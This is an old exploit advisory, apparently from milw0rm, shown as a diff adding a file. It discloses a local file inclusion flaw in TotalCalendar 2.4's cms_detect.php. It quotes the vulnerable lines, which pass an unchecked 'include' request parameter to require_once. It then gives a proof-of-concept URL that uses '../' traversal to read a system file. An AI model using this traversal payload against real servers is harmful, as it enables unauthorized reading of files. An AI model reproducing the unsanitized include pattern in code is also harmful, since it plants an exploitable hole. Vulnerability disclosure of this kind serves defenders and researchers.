@@ -1,0 +1,23 @@
+##########################################################################################
+[+] TotalCalendar 2.4 (include) Local File Inclusion
+[+] Discovered By SirGod
+[+] www.mortal-team.org
+[+] www.h4cky0u.org
+##########################################################################################
+
+[+] Local File Inclusion
+
+Vulnerable code in cms_detect.php:
+
+-------------------------------------------------------------------------------
+Line 26 : $include = isset($_REQUEST['include']) ? $_REQUEST['include'] : null;
+Line 115 : if(!empty($include)) require_once($inc_dir.$include);
+-------------------------------------------------------------------------------
+
+  PoC :
+
+   http://127.0.0.1/[path]/cms_detect.php?include=../../../../../../BOOTSECT.BAK
+
+##########################################################################################
+
+# milw0rm.com [2009-04-21]
